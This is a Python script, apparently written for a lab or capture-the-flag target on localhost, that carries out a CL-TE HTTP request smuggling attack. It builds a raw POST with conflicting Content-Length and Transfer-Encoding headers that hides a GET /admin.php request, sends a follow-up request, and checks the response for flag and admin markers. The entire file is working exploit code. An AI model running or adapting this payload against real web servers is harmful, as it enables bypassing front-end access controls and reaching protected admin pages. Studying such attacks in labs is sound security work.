import socket
import time
import sys



class Color:
    RED     = '\033[91m'
    GREEN   = '\033[92m'
    YELLOW  = '\033[93m'
    BLUE    = '\033[94m'
    CYAN    = '\033[96m'
    RESET   = '\033[0m'

def log(msg, level="info"):
    prefix = {
        "info":    ("[*]", Color.BLUE),
        "ok":      ("[+]", Color.GREEN),
        "warn":    ("[!]", Color.YELLOW),
        "error":   ("[-]", Color.RED),
    }

    p, c = prefix.get(level, ("[*]", Color.BLUE))
    print(f"{c}{p} {msg}{Color.RESET}")

def banner():
    print(Color.CYAN + "=" * 68)
    print(" HTTP REQUEST SMUGGLING - CL-TE RESEARCH EXPLOIT")
    print("=" * 68 + Color.RESET)


TARGET = "localhost"
PORT   = 8000
TIMEOUT = 8

CONTENT_LENGTH = 56  


def build_smuggling_payload():
    payload = f"""POST /vulnerable.php HTTP/1.1
Host: {TARGET}
Content-Type: application/x-www-form-urlencoded
Content-Length: {CONTENT_LENGTH}
Transfer-Encoding: chunked
X-Research: smuggling-test

0

GET /admin.php HTTP/1.1
Host: {TARGET}
X-Smuggled: true
Connection: keep-alive


"""
    return payload.replace("\n", "\r\n").encode()

def build_followup_request():
    req = f"""GET /admin.php HTTP/1.1
Host: {TARGET}
Connection: close
User-Agent: Smuggling-Client/1.0

"""
    return req.replace("\n", "\r\n").encode()

def send_raw(payload, recv=True):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(TIMEOUT)
    s.connect((TARGET, PORT))
    s.sendall(payload)

    data = b""
    if recv:
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass

    s.close()
    return data

def main():
    banner()

    log(f"Target: {TARGET}:{PORT}", "info")

    #  Smuggling Injection
    log("Phase 1: Sending smuggled request", "warn")
    payload = build_smuggling_payload()

    try:
        send_raw(payload, recv=False)
        log("Smuggling payload delivered", "ok")
    except Exception as e:
        log(f"Phase 1 failed: {e}", "error")
        sys.exit(1)

    time.sleep(2)

    log("Phase 2: Sending follow-up request", "warn")

    try:
        response = send_raw(build_followup_request())
        log("Follow-up request completed", "ok")
    except Exception as e:
        log(f"Phase 2 failed: {e}", "error")
        sys.exit(1)

    print()
    print(Color.CYAN + "-" * 68)
    print(" RESPONSE ANALYSIS")
    print("-" * 68 + Color.RESET)

    if not response:
        log("No response received", "error")
        log("Possible causes:", "warn")
        log("• Smuggling not successful", "warn")
        log("• Incorrect Content-Length value", "warn")
        log("• Target behavior differs", "warn")
        return

    text = response.decode(errors="ignore")
    status = text.split("\r\n")[0] if "\r\n" in text else "UNKNOWN"

    log(f"HTTP Status : {status}", "info")
    log(f"Response size: {len(response)} bytes", "info")

    indicators = [
        "FLAG",
        "ADMIN",
        "SMUGGLE",
        "INTERNAL",
        "SUCCESS"
    ]

    matched = [i for i in indicators if i in text]

    if matched:
        log("Smuggling SUCCESSFUL", "ok")
        log("Indicators found:", "ok")
        for m in matched:
            log(f"• {m}", "ok")

        print()
        print(Color.GREEN + "[+] Relevant response excerpt:")
        print("-" * 50 + Color.RESET)

        for line in text.splitlines():
            if any(i in line for i in matched):
                print(Color.GREEN + line + Color.RESET)

    else:
        log("No smuggling indicators detected", "warn")

    print()
    log("Exploit completed", "info")



if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log("Interrupted by user", "warn")
